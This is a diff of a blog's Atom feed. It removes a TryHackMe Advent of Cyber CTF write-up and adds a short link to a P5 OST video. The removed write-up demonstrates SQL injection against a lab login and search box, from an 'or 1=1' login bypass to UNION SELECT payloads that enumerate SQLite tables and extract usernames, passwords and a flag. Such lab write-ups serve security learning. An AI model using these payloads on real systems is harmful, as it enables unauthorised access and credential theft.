-&lt;ul&gt;
-  &lt;li&gt;A simple and classic SQLi gets us in:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'or 1=1--&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/badboilogin.png&quot; alt=&quot;badboilogin.png&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Just to take a look at what information we have access to upfront, we can get all search button related output by trying a wildcard:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/d01b15ca70e045c397034252c2769587.png&quot; alt=&quot;37de0ab710e9d480cc41b2ed5193a753.png&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;As for an injection vector, one of the provided resources for this challenge includes a &lt;a href=&quot;https://github.com/payloadbox/sql-injection-payload-list&quot; target=&quot;_blank&quot;&gt;list of generic payloads&lt;/a&gt; that we can try out. Here’s one string that yields an error message:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/06fa999848894cbd964eeb2da8ec5041.png&quot; alt=&quot;fba82e82ee07183820e349147aa9c123.png&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;It looks like this will work, we just need to make a small adjustment because we have 2 output columns:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Badboi' UNION SELECT 1, 2--&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/29f06dd5da49482e9f67fd8114809547.png&quot; alt=&quot;031ad161871e6b41493e28d231633b90.png&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Now we need to leverage this vulnerability to find out what tables are in the database.  We had a hint in the challenge text:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Santa's TODO: Look at alternative database systems that are better than sqlite.&lt;/code&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Based on this, we can assume SQLite is the database that is running.  The search for some payloads that we can adapt is made easier thanks to &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md&quot; target=&quot;_blank&quot;&gt;another resource shared in the challenge description&lt;/a&gt;. Re-working the syntax of the &lt;em&gt;“Integer/String based - Extract table name”&lt;/em&gt; payload just a bit:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Badboi' UNION SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/dd2ff72ac7644a869b52e2842fd71317.png&quot; alt=&quot;3a432b4959a9aac3e635618b51163f41.png&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;And then doing the same with a payload for column discovery:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/46fd0eb327d442d6a303186db5e233ab.png&quot; alt=&quot;1c5324b827db2a2ea0f7ed1018c3526f.png&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;After doing this for each table, we can output the contents of the details we want to see:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, username FROM users--&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/080978b7226f40b6964ca21d86c4260d.png&quot; alt=&quot;0bdc0e71277868101f7c77e063bf562e.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, password FROM users--&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/ba3b17ac13b546db8a400c979b7bd644.png&quot; alt=&quot;2a4d9996142daa35fd8ac35f9258056c.png&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;In a more targeted fashion that might have been useful in other situations:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION ALL SELECT NULL, password FROM users WHERE username LIKE 'Admin' --&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/49a29d9f490f42e6bdad559338426d66.png&quot; alt=&quot;d9f814e92318bf197fa8e1369ee879d1.png&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;or&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, kid FROM sequels WHERE title LIKE '%Try%' --&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/6319907a5e6346239668f91a4c1c26e3.png&quot; alt=&quot;2538f2ad6752664f59a38c8bf769565b.png&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;and in the case of the challenge we also specifically want:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, flag FROM hidden_table --&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/b9d2ecbcf5b643a3ac05bfc94c3a85dc.png&quot; alt=&quot;a7b2d6fdbc6a1a55e416899387936018.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;It was worth taking the extra time to solve the challenge this way, and I definitely appreciate sqlmap for all it automates and how it formats things a lot more now.&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="TryHackMe" /><summary type="html"></summary></entry></feed>
+&lt;a href=&quot;https://www.youtube.com/watch?v=08vrKZcA6eE&quot; target=&quot;_blank&quot;&gt;P5 OST&lt;/a&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;resources&quot;]" /><category term="resources" /><category term="everything" /><summary type="html">All The Things P5 OST</summary></entry></feed>
